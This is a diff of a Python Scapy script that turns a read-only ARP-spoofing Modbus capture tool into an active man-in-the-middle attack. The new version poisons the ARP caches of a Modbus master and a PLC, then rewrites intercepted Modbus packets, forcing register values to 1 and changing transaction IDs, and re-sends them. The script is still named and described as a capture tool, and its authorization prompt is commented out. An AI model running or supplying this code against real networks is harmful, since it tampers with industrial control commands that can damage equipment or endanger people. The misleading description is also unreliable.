@@ -1,173 +1,190 @@
 #!/usr/bin/env python3
 """
-ARP MITM using Scapy — for use on networks you own or are explicitly
-authorized to test (e.g. a home lab). Poisons the ARP caches of a
-victim and a gateway so traffic between them flows through this host.
+modbus_mitm_capture.py
 
-Requires: enabling IP forwarding on this machine, e.g.
-    sudo sysctl -w net.ipv4.ip_forward=1
-and running with raw-socket privileges (root, or CAP_NET_RAW).
+Modbus/TCP MITM capture tool using ARP spoofing to reposition traffic
+between a Modbus master and slave onto this host, then decoding the
+Modbus/TCP traffic that flows through.
+
+Requires: scapy, root privileges, and IPv4 forwarding support
+  pip install scapy --break-system-packages
+
+Usage:
+  sudo python3 modbus_mitm_capture.py -i eth0 --victim 192.168.1.50 --target 192.168.1.10
 """
 
+import argparse
+import struct
+import subprocess
 import sys
-import time
-import json
 import threading
-from scapy.all import ARP, Ether, IP, TCP, srp, sendp, sniff, wrpcap
-from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
+import time
+from datetime import datetime, timezone
+
+try:
+    from scapy.all import (
+        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
+    )
+    from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
+except ImportError:
+    print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
+    sys.exit(1)
+
+def log_line(msg, log_file=None):
+    line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
+    print(line)
+    if log_file:
+        log_file.write(line + "\n")
+        log_file.flush()
+
+def get_mac(ip, iface, timeout=3):
+    ans = sr1(ARP(op=1, pdst=ip), timeout=timeout, iface=iface, verbose=0)
+    return ans[ARP].hwsrc if ans else None
 
 
-def get_mac(ip, iface, timeout=2):
-    """Resolve the MAC address for a given IP via ARP request."""
-    arp_request = ARP(pdst=ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = broadcast / arp_request
-    answered = srp(packet, timeout=timeout, iface=iface, verbose=False)[0]
-    if answered:
-        return answered[0][1].hwsrc
-    return None
+def arp_spoof_loop(iface, victim_ip, victim_mac, target_ip, target_mac, own_mac, stop_event, interval=2):
+    while not stop_event.is_set():
+        # Tell victim that we are the target
+        pkt1 = Ether(dst=victim_mac, src=own_mac) / ARP(
+            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=own_mac
+        )
+        # Tell target that we are the victim
+        pkt2 = Ether(dst=target_mac, src=own_mac) / ARP(
+            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=own_mac
+        )
+        sendp(pkt1, iface=iface, verbose=0)
+        sendp(pkt2, iface=iface, verbose=0)
+        stop_event.wait(interval)
 
 
-def spoof(target_ip, target_mac, impersonate_ip, iface):
-    """
-    Send a spoofed ARP reply to target_ip claiming that impersonate_ip
-    is at our own MAC. Built as a full Ether/ARP frame and sent with
-    sendp() (layer 2) so the Ethernet destination MAC is set explicitly —
-    using send() (layer 3) here leaves that field unset and triggers
-    Scapy's "should be providing the Ethernet destination MAC" warning.
-    """
-    ether = Ether(dst=target_mac)
-    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip)
-    sendp(ether / arp, iface=iface, verbose=False)
+def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
+    # Send correct mappings a few times to overwrite the poisoned entries
+    for _ in range(5):
+        pkt1 = Ether(dst=victim_mac, src=target_mac) / ARP(
+            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac
+        )
+        pkt2 = Ether(dst=target_mac, src=victim_mac) / ARP(
+            op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac
+        )
+        sendp(pkt1, iface=iface, verbose=0)
+        sendp(pkt2, iface=iface, verbose=0)
+        time.sleep(0.3)
 
 
-def restore(dest_ip, dest_mac, src_ip, src_mac, iface):
-    """Send the correct ARP mapping to undo poisoning on exit."""
-    ether = Ether(dst=dest_mac)
-    arp = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
-    sendp(ether / arp, iface=iface, count=4, verbose=False)
+def handle_packet(pkt, port, log_file,mappings):
+    src = "00:0c:29:5d:1f:95" # TODO: Make this automatic rather than hard coded
+    dst = pkt[IP].dst 
 
+    print("Source: "+src)
+    print("Dest: "+str(mappings[dst]))
 
-_captured_packets = []
-_decoded_log = []
-_stop_sniff = threading.Event()
+    npkt=pkt
+    npkt[Ether].src=src
+    npkt[Ether].dst=mappings[dst]
+    # print(npkt.show(dump=True))
 
-# Modbus function codes, grouped for quick classification.
-# (Reference only — nothing here alters or forwards traffic.)
-_READ_CODES = {0x01, 0x02, 0x03, 0x04, 0x07}
-_WRITE_CODES = {0x05, 0x06, 0x0F, 0x10, 0x16}
+    # if not (npkt.haslayer(TCP) and npkt.haslayer(IP)):
+    #     sendp(npkt,loop=0,inter=0.2)
+    #     return
 
-
-def handle_modbus_packet(pkt):
-    """
-    Read-only decode of a sniffed Modbus/TCP packet into a structured
-    record: MBAP header fields plus whatever the function-specific PDU
-    fields are (address, quantity, value, etc.), pulled generically via
-    pdu.fields_desc rather than hardcoding field names per function code
-    — so this doesn't drift if the contrib module's field names differ
-    slightly across Scapy versions.
-    """
-    if not (pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)):
+    if npkt.haslayer(ModbusADURequest):
+        mb = npkt[ModbusADURequest]
+    elif npkt.haslayer(ModbusADUResponse):
+        mb = npkt[ModbusADUResponse]
+    else:
+        sendp(npkt,loop=0,inter=0.2)
         return
 
-    _captured_packets.append(pkt)
+    tcp = npkt[TCP]
+   
+    if tcp.sport != port and tcp.dport != port:
+        return
+    direction = "req " if tcp.dport == port else "resp"
+    src = f"{npkt[IP].src}:{tcp.sport}"
+    dst = f"{npkt[IP].dst}:{tcp.dport}"
+    log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
-    adu = pkt[ModbusADURequest] if pkt.haslayer(ModbusADURequest) else pkt[ModbusADUResponse]
-    pdu = pkt.lastlayer()  # most specific dissected layer, e.g. a Read/Write PDU
+    
+    if npkt.haslayer(ModbusADURequest):
+        npkt[ModbusADURequest].registerValue=1
+        print(f"Register Value: ",npkt[ModbusADURequest].registerValue)
+        npkt[ModbusADURequest].transId=4660
+    elif npkt.haslayer(ModbusADUResponse):
+        npkt[ModbusADUResponse].registerValue=1
+        print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
+        npkt[ModbusADUResponse].transId=4660
 
-    fields = {f.name: getattr(pdu, f.name) for f in pdu.fields_desc}
-    func_code = fields.get("funcCode")
-    category = (
-        "WRITE" if func_code in _WRITE_CODES else
-        "READ" if func_code in _READ_CODES else
-        "OTHER"
-    )
+    # del p.chksum
+    del npkt[TCP].chksum
+    del npkt[IP].chksum
 
-    record = {
-        "time": time.time(),
-        "src": pkt[IP].src if pkt.haslayer(IP) else None,
-        "dst": pkt[IP].dst if pkt.haslayer(IP) else None,
-        "unit_id": getattr(adu, "unitId", None),
-        "transaction_id": getattr(adu, "transId", None),
-        "pdu_type": pdu.__class__.__name__,
-        "category": category,
-        "fields": fields,
-    }
-    _decoded_log.append(record)
-
-    print(
-        f"[{category:<5}] {record['src']:>15} -> {record['dst']:<15} "
-        f"unit={record['unit_id']} {record['pdu_type']}: {fields}"
-    )
+    # print(npkt.show(dump=True))
+    sendp(npkt,loop=0,inter=0.2)
 
 
-def dump_decoded_log(path):
-    """Write the structured decode log out as JSON Lines for later analysis."""
-    with open(path, "w") as f:
-        for record in _decoded_log:
-            f.write(json.dumps(record, default=str) + "\n")
+def main():
+    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("-i", "--interface", required=True, help="Interface to use")
+    ap.add_argument("--victim", required=True, help="IP of the Modbus master (client)")
+    ap.add_argument("--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
+    ap.add_argument("--port", type=int, default=502, help="Modbus/TCP port (default 502)")
+    ap.add_argument("--log", help="Optional path to append decoded output to")
+    ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
+    args = ap.parse_args()
 
+    print("This tool actively repositions traffic via ARP spoofing.")
+    print(f"Target scope: victim={args.victim}  target={args.target}  iface={args.interface}")
+    # confirm = input("Type YES to confirm you own/are authorized to test this network: ")
+    # if confirm.strip() != "YES":
+    #     print("Confirmation not received, aborting.")
+    #     sys.exit(1)
 
-def start_capture(iface):
-    """
-    Sniff Modbus/TCP traffic (port 502) until _stop_sniff is set.
-    Runs in its own thread alongside the ARP poisoning loop. If you
-    already have a callback in your toolkit's sniffer module, swap
-    handle_modbus_packet for that instead of duplicating parsing logic.
-    """
-    sniff(
-        iface=iface,
-        filter="tcp port 502",
-        prn=handle_modbus_packet,
-        stop_filter=lambda p: _stop_sniff.is_set(),
-        store=False,
-    )
+    conf.iface = args.interface
+    own_mac = get_if_hwaddr(args.interface)
 
+    log_file = open(args.log, "a") if args.log else None
+    stop_event = threading.Event()
 
-def arp_mitm(victim_ip, gateway_ip, iface, interval=2, pcap_out=None, decoded_log_out=None):
-    victim_mac = get_mac(victim_ip, iface)
-    gateway_mac = get_mac(gateway_ip, iface)
-
-    if not victim_mac or not gateway_mac:
-        print("Could not resolve one or both MAC addresses. Aborting.")
+    victim_mac = get_mac(args.victim, args.interface)
+    target_mac = get_mac(args.target, args.interface)
+    if not victim_mac or not target_mac:
+        print("Could not resolve MAC address for victim or target — aborting.", file=sys.stderr)
         sys.exit(1)
 
-    print(f"Victim  {victim_ip} is at {victim_mac}")
-    print(f"Gateway {gateway_ip} is at {gateway_mac}")
-    print("Starting ARP poisoning + Modbus capture. Ctrl+C to stop and restore tables.")
+    log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
+    log_line(f"Resolved target {args.target} -> {target_mac}", log_file)
 
-    capture_thread = threading.Thread(target=start_capture, args=(iface,), daemon=True)
-    capture_thread.start()
+    # set_ip_forwarding(True)
+    spoof_thread = threading.Thread(
+        target=arp_spoof_loop,
+        args=(args.interface, args.victim, victim_mac, args.target, target_mac, own_mac, stop_event, args.arp_interval),
+        daemon=True,
+    )
+    spoof_thread.start()
+    log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
+    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src 00:0c:29:5d:1f:95"
+
+    # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
+
+    mappings = {args.victim:victim_mac,args.target:target_mac}
+    
     try:
-        while True:
-            spoof(victim_ip, victim_mac, gateway_ip, iface)
-            spoof(gateway_ip, gateway_mac, victim_ip, iface)
-            time.sleep(interval)
+        sniff(iface=args.interface, filter=bpf_filter,
+              prn=lambda p: handle_packet(p, args.port, log_file,mappings), store=False)
+        # sniff(iface=args.interface,
+        #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
     except KeyboardInterrupt:
-        print("\nStopping capture and restoring ARP tables...")
-        _stop_sniff.set()
-        capture_thread.join(timeout=5)
-
-        if pcap_out and _captured_packets:
-            wrpcap(pcap_out, _captured_packets)
-            print(f"Saved {len(_captured_packets)} packets to {pcap_out}")
-
-        if decoded_log_out and _decoded_log:
-            dump_decoded_log(decoded_log_out)
-            print(f"Saved {len(_decoded_log)} decoded records to {decoded_log_out}")
-
-        restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
-        restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
-        print("Done.")
+        pass
+    finally:
+        log_line("Stopping — restoring ARP tables and disabling forwarding.", log_file)
+        stop_event.set()
+        spoof_thread.join(timeout=2)
+        restore_arp(args.interface, args.victim, victim_mac, args.target, target_mac)
+        # set_ip_forwarding(False)
+        if log_file:
+            log_file.close()
 
 
 if __name__ == "__main__":
-    # Example values — replace with your lab's actual addresses/interface.
-    VICTIM_IP = "192.168.1.50"
-    GATEWAY_IP = "192.168.1.1"
-    IFACE = "eth0"
-    PCAP_OUT = "modbus_capture.pcap"
-    DECODED_LOG_OUT = "modbus_decoded.jsonl"
-
-    arp_mitm(VICTIM_IP, GATEWAY_IP, IFACE, pcap_out=PCAP_OUT, decoded_log_out=DECODED_LOG_OUT)
+    main()
